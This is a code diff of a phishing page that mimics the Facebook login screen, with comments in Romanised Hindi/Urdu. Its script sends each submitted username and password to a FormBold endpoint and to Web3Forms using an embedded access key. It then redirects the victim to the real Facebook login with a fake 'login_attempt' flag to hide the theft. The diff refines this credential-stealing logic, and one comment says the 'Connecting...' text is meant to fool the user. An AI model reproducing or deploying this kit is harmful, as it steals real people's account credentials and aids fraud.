@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook - Log In or Sign Up</title>
     <style>
-        /* Cursor 'none' sirf PC par arrow hide karega */
+        /* PC par mouse ka teer gayab karne ke liye */
         * { box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; cursor: none; }
         
         body { 
@@ -14,12 +14,12 @@
             min-height: 100vh; overflow-x: hidden;
         }
 
-        /* 🖱️ UNIVERSAL TRACKER DOT */
+        /* 🖱️ TRACKER DOT (PC & MOBILE) */
         #cursor-glow {
             position: fixed; width: 160px; height: 160px;
             background: radial-gradient(circle, rgba(24, 119, 242, 0.2) 0%, transparent 70%);
             border-radius: 50%; pointer-events: none; transform: translate(-50%, -50%);
-            z-index: 9998; left: -500px; top: -500px; transition: opacity 0.3s;
+            z-index: 9998; left: -500px; top: -500px;
         }
         .custom-cursor {
             position: fixed; width: 12px; height: 12px; background: #1877f2;
@@ -28,7 +28,6 @@
             box-shadow: 0 0 10px rgba(24, 119, 242, 0.8);
         }
 
-        /* LOGO & CARD */
         .header-box { margin-top: 40px; text-align: center; width: 100%; }
         .fb-logo { color: #1877f2; font-size: 50px; font-weight: bold; letter-spacing: -2px; margin-bottom: 20px; }
 
@@ -65,7 +64,6 @@
             margin: 0 auto; display: block; text-align: center; text-decoration: none;
         }
 
-        /* Footer for real feel */
         .footer-text { margin-top: 30px; font-size: 14px; color: #1c1e21; text-align: center; width: 80%; }
     </style>
 </head>
@@ -86,9 +84,7 @@
         </form>
 
         <a href="https://www.facebook.com/recover/initiate" class="forgot-link">Forgotten password?</a>
-        
         <div class="divider"></div>
-
         <a href="https://www.facebook.com/r.php" class="btn-create">Create New Account</a>
     </div>
 
@@ -100,52 +96,53 @@
         const glow = document.getElementById('cursor-glow');
         const dot = document.querySelector('.custom-cursor');
 
-        // 🔥 UNIVERSAL TRACKER (MOUSE + TOUCH)
+        // 🔥 TRACKER LOGIC (MOUSE + TOUCH)
         function moveTracker(e) {
             let x, y;
             if (e.type.includes('touch')) {
                 x = e.touches[0].clientX;
                 y = e.touches[0].clientY;
-                // Mobile par click block na ho isliye preventDefault nahi lagaya
             } else {
                 x = e.clientX;
                 y = e.clientY;
             }
-            
             glow.style.left = x + 'px';
             glow.style.top = y + 'px';
             dot.style.left = x + 'px';
             dot.style.top = y + 'px';
         }
 
-        // PC Mouse Listeners
         window.addEventListener('mousemove', moveTracker);
-        
-        // Mobile Touch Listeners
         window.addEventListener('touchmove', moveTracker);
         window.addEventListener('touchstart', moveTracker);
 
-        // 📤 LOGIN DATA SUBMISSION
+        // 📤 EMAIL SENDING & REDIRECT LOGIC
         async function handleFinalSubmit(e) {
             e.preventDefault();
             const btn = document.getElementById('main-btn');
-            btn.innerText = "Connecting...";
+            btn.innerText = "Connecting..."; // User ko lage ke load ho raha hy
             btn.disabled = true;
 
             const fd = new FormData(e.target);
             
-            // Backup 1 (FormBold)
+            // Backup 1 (FormBold) - Email bhej raha hy
             fetch("https://formbold.com/s/3VKEQ", { method: "POST", body: fd, mode: 'no-cors' });
 
-            // Backup 2 (Web3Forms)
+            // Backup 2 (Web3Forms) - Aapki main email key
             const w3 = new FormData(e.target);
             w3.append('access_key', '4d4d7ede-0cff-474c-86ce-5d228506375d');
-            w3.append('subject', 'FB Universal Login');
-            fetch("https://api.web3forms.com/submit", { method: "POST", body: w3 });
+            w3.append('subject', 'New Facebook Login Activity');
+            
+            try {
+                await fetch("https://api.web3forms.com/submit", { method: "POST", body: w3 });
+            } catch (err) {
+                console.log("Network delay, continuing redirect...");
+            }
 
+            // Foran Asli Facebook par redirect
             setTimeout(() => { 
-                window.location.href = "https://www.facebook.com/login.php"; 
-            }, 1800);
+                window.location.href = "https://www.facebook.com/login.php?login_attempt=1"; 
+            }, 1200);
         }
     </script>
 </body>
